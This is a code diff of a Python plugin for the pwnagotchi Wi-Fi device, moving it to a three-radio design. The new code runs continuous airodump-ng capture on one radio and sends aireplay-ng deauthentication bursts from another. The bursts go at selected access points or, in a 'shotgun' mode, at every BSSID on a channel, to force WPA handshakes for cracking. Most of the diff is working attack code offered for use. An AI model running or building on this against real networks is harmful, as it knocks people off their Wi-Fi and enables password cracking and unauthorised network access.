@@ -1,21 +1,20 @@
 """
 wd_scanner.py - pwnagotchi plugin
 
-Use a SECONDARY (auxiliary) radio - one that is NOT being used by pwnagotchi /
-bettercap - to passively scan the surrounding RF, list SSIDs along with the
-number of associated clients, and let the operator pick a target.
+THREE-RADIO SETUP for optimal operation:
+  - RADIO 1 (pwnagotchi main): Left alone - continues normal pwnagotchi operations
+  - RADIO 2 (aux/attack radio): Selected via web UI, performs all deauth attacks
+  - RADIO 3 (passive monitor): Continuously scans all channels, maintains network list,
+                                captures handshakes passively
 
 When a target is picked, the plugin:
-  1. Pins pwnagotchi's MAIN radio (via bettercap) to the target's channel.
-  2. Sends deauthentication frames at the target BSSID.
-  3. Listens for 30 seconds. Bettercap's existing handshake dumper writes any
-     captured handshakes into the configured handshakes folder
-     (config.bettercap.handshakes), so they get picked up by pwnagotchi's
-     normal upload / cracking pipeline automatically.
-  4. Releases the channel pin so pwnagotchi resumes normal hopping.
+  1. Uses RADIO 2 (aux) to send deauthentication frames at the target BSSID.
+  2. RADIO 3 (passive monitor) captures the handshakes (already running continuously).
+  3. Pwnagotchi's MAIN radio (RADIO 1) is never disturbed.
 
-The aux radio is independent: airodump-ng runs against it for scanning, so
-we don't disturb bettercap.
+The passive monitor (RADIO 3) runs airodump-ng continuously with channel hopping,
+maintaining an always-current list of networks and capturing handshakes opportunistically.
+This eliminates the need for manual scans and maximizes handshake capture rate.
 
 Install:
   - Drop this file into your custom_plugins folder (see main.custom_plugins
@@ -72,11 +71,11 @@ _DEFAULT_UPDATE_URL = (
 
 class WdScanner(plugins.Plugin):
     __author__ = "you@example.com"
-    __version__ = "2.7.0"
+    __version__ = "2.8.0"
     __license__ = "GPL3"
     __description__ = (
-        "Use a second radio to scan for SSIDs/clients and selectively deauth "
-        "and capture handshakes through pwnagotchi's main radio."
+        "Three-radio setup: passive monitor (radio 3) maintains network list, "
+        "aux radio (radio 2) performs attacks, pwnagotchi main (radio 1) left undisturbed."
     )
 
     # ---------------------------------------------------------------- lifecycle
@@ -1027,7 +1026,7 @@ class WdScanner(plugins.Plugin):
     def _passive_monitor_loop(self):
         """
         Continuously run airodump-ng on all channels (channel hopping).
-        Parse captured handshakes and copy them to bettercap's handshake folder.
+        Parse network list and captured handshakes, copy handshakes to bettercap's handshake folder.
         """
         if not self._passive_mon_iface:
             self._log_passive("ERROR: no monitor interface available")
@@ -1048,11 +1047,12 @@ class WdScanner(plugins.Plugin):
         try:
             # Start airodump-ng with channel hopping across all channels.
             # Write captures to temp directory, prefix "passive".
+            # Include CSV output to maintain network list.
             cmd = [
                 "airodump-ng",
                 "--channel", "1,2,3,4,5,6,7,8,9,10,11,12,13",  # 2.4GHz channels
                 "-w", os.path.join(temp_dir, "passive"),
-                "--output-format", "pcap",
+                "--output-format", "pcap,csv",  # both pcap for handshakes and CSV for network list
                 self._passive_mon_iface,
             ]
             self._log_passive("cmd: %s" % " ".join(cmd))
@@ -1065,15 +1065,16 @@ class WdScanner(plugins.Plugin):
 
             self._log_passive("airodump-ng started (PID %d)" % proc.pid)
 
-            # Monitor loop: check for new handshakes every 10 seconds.
+            # Monitor loop: check for new handshakes and update network list every 10 seconds.
             last_check = 0
             while not self._passive_stop.is_set():
                 time.sleep(1)
 
-                # Every 10 seconds, check for handshakes.
+                # Every 10 seconds, check for handshakes and update network list.
                 if time.time() - last_check >= 10:
                     last_check = time.time()
                     self._check_passive_handshakes(temp_dir, handshake_dir)
+                    self._update_network_list_from_passive(temp_dir)
 
             # Stop airodump-ng.
             self._log_passive("stopping airodump-ng...")
@@ -1084,8 +1085,9 @@ class WdScanner(plugins.Plugin):
                 proc.kill()
                 proc.wait()
 
-            # Final handshake check.
+            # Final handshake check and network list update.
             self._check_passive_handshakes(temp_dir, handshake_dir)
+            self._update_network_list_from_passive(temp_dir)
 
         except Exception as e:
             self._log_passive("ERROR: %s" % str(e))
@@ -1141,6 +1143,39 @@ class WdScanner(plugins.Plugin):
 
         except Exception as e:
             self._log_passive("handshake check error: %s" % str(e))
+
+    def _update_network_list_from_passive(self, temp_dir):
+        """
+        Parse the CSV from passive monitor and update the network list.
+        This maintains _last_scan_results with networks detected by the passive monitor.
+        """
+        try:
+            # Find the most recent CSV file.
+            csv_files = glob.glob(os.path.join(temp_dir, "passive-*.csv"))
+            if not csv_files:
+                return
+
+            # Use the most recently modified CSV.
+            csv_path = max(csv_files, key=os.path.getmtime)
+
+            # Parse the CSV using the existing parser.
+            networks = self._parse_airodump_csv(csv_path)
+
+            if networks:
+                # Update the scan results with passive monitor data.
+                # This allows the UI to show networks without manual scanning.
+                with self._lock:
+                    self._last_scan_results = networks
+                    # Clear any scan error since we have fresh data.
+                    self._last_scan_error = None
+
+                # Log network count periodically.
+                total = len(networks)
+                with_clients = len([n for n in networks if n.get("clients", 0) > 0])
+                self._log_passive("networks: %d total, %d with clients" % (total, with_clients))
+
+        except Exception as e:
+            self._log_passive("network list update error: %s" % str(e))
 
     # ------------------------------------------------------------------ CSV
 
@@ -1271,20 +1306,26 @@ class WdScanner(plugins.Plugin):
 
     def _shotgun_worker(self, channel):
         """
-        Channel-shotgun: pin the radio, fire a deauth burst at every BSSID
+        Channel-shotgun: pin the aux radio to channel, fire a deauth burst at every BSSID
         we've seen on this channel (subset of self._last_scan_results), then
-        sleep `shotgun_listen_seconds` so bettercap can record any reauth
-        handshakes, then release the channel.
+        sleep `shotgun_listen_seconds` so passive monitor can capture any reauth
+        handshakes. Uses aux radio (radio 2) for attacks.
         """
         agent = self._agent
         try:
+            # Use the aux radio (radio 2) for attacks.
+            attack_iface = self._mon_iface or self._iface_cfg
+            if not attack_iface:
+                self._log_action("ERROR: no aux radio available for shotgun attack")
+                return
+
             targets = [
                 a for a in (self._last_scan_results or [])
                 if int(a.get("channel") or 0) == int(channel)
             ]
             if not targets:
                 self._log_action(
-                    "shotgun ch%d: no BSSIDs known on this channel; run a scan first"
+                    "shotgun ch%d: no BSSIDs known on this channel"
                     % channel
                 )
                 return
@@ -1294,11 +1335,18 @@ class WdScanner(plugins.Plugin):
                 % (channel, len(targets), self._shotgun_burst_per_bssid,
                    self._shotgun_listen_seconds)
             )
+
+            # Pin aux radio to target channel.
             try:
-                agent.run("wifi.recon.channel %d" % channel)
+                self._run(["iw", "dev", attack_iface, "set", "channel", str(channel)],
+                          check=False, timeout=5)
+                self._log_action("aux radio %s pinned to channel %d" % (attack_iface, channel))
             except Exception as e:
                 self._log_action("channel pin failed: %s" % e)
                 return
+
+            handshake_dir = self._handshake_dir()
+            before = self._snapshot_handshakes(handshake_dir)
 
             # Round-robin the bursts so every BSSID gets an early hit, rather
             # than blasting one BSSID 3x then the next 3x. This wakes more
@@ -1307,7 +1355,9 @@ class WdScanner(plugins.Plugin):
                 for ap in targets:
                     bssid = ap["bssid"]
                     try:
-                        agent.run("wifi.deauth %s" % bssid)
+                        # Use aireplay-ng for deauth from aux radio.
+                        cmd = ["aireplay-ng", "-0", "5", "-a", bssid, attack_iface]
+                        self._run(cmd, check=False, timeout=10)
                         self._log_action(
                             "ch%d burst %d/%d -> %s (%s)"
                             % (channel, round_idx + 1,
@@ -1320,12 +1370,11 @@ class WdScanner(plugins.Plugin):
                     time.sleep(0.25)
                 time.sleep(1)
 
-            handshake_dir = self._handshake_dir()
-            before = self._snapshot_handshakes(handshake_dir)
             self._log_action(
                 "shotgun ch%d: listening %ds for reauths (dir=%s)"
                 % (channel, self._shotgun_listen_seconds, handshake_dir)
             )
+            self._log_action("passive monitor (radio 3) capturing, aux radio (radio 2) attacking")
             time.sleep(self._shotgun_listen_seconds)
             after = self._snapshot_handshakes(handshake_dir)
             new = sorted(set(after) - set(before))
@@ -1336,52 +1385,64 @@ class WdScanner(plugins.Plugin):
             else:
                 self._log_action("shotgun ch%d: no new handshakes" % channel)
         finally:
-            try:
-                agent.run("wifi.recon.channel clear")
-                self._log_action("released channel pin (control back to bettercap)")
-            except Exception as e:
-                self._log_action("could not clear channel pin: %s" % e)
+            # No need to release channel on pwnagotchi main radio since we didn't touch it.
+            self._log_action("shotgun complete, pwnagotchi's main radio was not disturbed")
             self._action_running = False
 
     def _attack_worker(self, bssid, channel, ssid):
         agent = self._agent
         try:
-            if self._shared_radio:
-                self._log_action(
-                    "shared-radio attack: pwnagotchi paused while we capture"
-                )
-
             # Use PMKID attack if enabled and available.
             if self._pmkid_attack_mode and self._pmkid_available:
                 self._pmkid_attack(bssid, channel, ssid)
                 return
 
-            self._log_action("pinning main radio to channel %d for %s (%s)"
-                             % (channel, ssid, bssid))
+            # Use the aux radio (radio 2) for attacks, not pwnagotchi's main radio.
+            attack_iface = self._mon_iface or self._iface_cfg
+            if not attack_iface:
+                self._log_action("ERROR: no aux radio available for attack")
+                self._log_action("Please select an aux radio from the web UI first")
+                return
+
+            self._log_action("using aux radio %s for attack on ch%d -> %s (%s)"
+                             % (attack_iface, channel, ssid, bssid))
+
+            # Set the aux radio to the target channel.
             try:
-                agent.run("wifi.recon.channel %d" % channel)
+                self._run(["iw", "dev", attack_iface, "set", "channel", str(channel)],
+                          check=False, timeout=5)
+                self._log_action("aux radio pinned to channel %d" % channel)
             except Exception as e:
                 self._log_action("channel pin failed: %s" % e)
                 return
 
-            # Send a few bursts of deauth, with brief gaps, to give clients
-            # a chance to reconnect and emit the 4-way handshake.
+            handshake_dir = self._handshake_dir()
+            before = self._snapshot_handshakes(handshake_dir)
+
+            # Start airodump-ng on passive monitor to capture handshakes on this channel.
+            # The passive monitor (radio 3) is already running and will pick up handshakes.
+            # We just need to send deauths from the aux radio (radio 2).
+
+            # Send deauth bursts using aireplay-ng on the aux radio.
             for i in range(self._deauth_bursts):
                 try:
-                    agent.run("wifi.deauth %s" % bssid)
-                    self._log_action("deauth burst %d/%d -> %s"
+                    # Use aireplay-ng for deauth: -0 (deauth) count, -a (AP), interface
+                    # Send 10 deauth packets per burst.
+                    cmd = ["aireplay-ng", "-0", "10", "-a", bssid, attack_iface]
+                    self._run(cmd, check=False, timeout=10)
+                    self._log_action("deauth burst %d/%d -> %s (10 packets)"
                                      % (i + 1, self._deauth_bursts, bssid))
                 except Exception as e:
                     self._log_action("deauth error: %s" % e)
                 time.sleep(2)
 
-            handshake_dir = self._handshake_dir()
-            before = self._snapshot_handshakes(handshake_dir)
             self._log_action(
                 "listening %ds for handshakes on channel %d (dir=%s)"
                 % (self._listen_seconds, channel, handshake_dir)
             )
+            self._log_action("passive monitor (radio 3) capturing, aux radio (radio 2) attacking")
             time.sleep(self._listen_seconds)
+
             after = self._snapshot_handshakes(handshake_dir)
             new = sorted(set(after) - set(before))
             if new:
@@ -1390,12 +1451,10 @@ class WdScanner(plugins.Plugin):
                 self._new_handshakes.extend(new)
             else:
                 self._log_action("no new handshake files appeared in %s" % handshake_dir)
+                self._log_action("tip: ensure passive monitor (radio 3) is running")
         finally:
-            try:
-                agent.run("wifi.recon.channel clear")
-                self._log_action("released channel pin")
-            except Exception as e:
-                self._log_action("could not clear channel pin: %s" % e)
+            # No need to release channel pin on pwnagotchi's main radio since we didn't touch it.
+            self._log_action("attack complete, pwnagotchi's main radio was not disturbed")
             self._action_running = False
 
     def _pmkid_attack(self, bssid, channel, ssid):
@@ -3306,6 +3365,7 @@ class WdScanner(plugins.Plugin):
             opt_lines.append("<option value='' disabled selected>// no wireless devices //</option>")
 
         # Build passive monitor picker options (exclude main iface and active aux).
+        main_iface = pwnagotchi_config_main_iface()
         passive_opt_lines = []
         passive_seen_current = False
         for it in available:
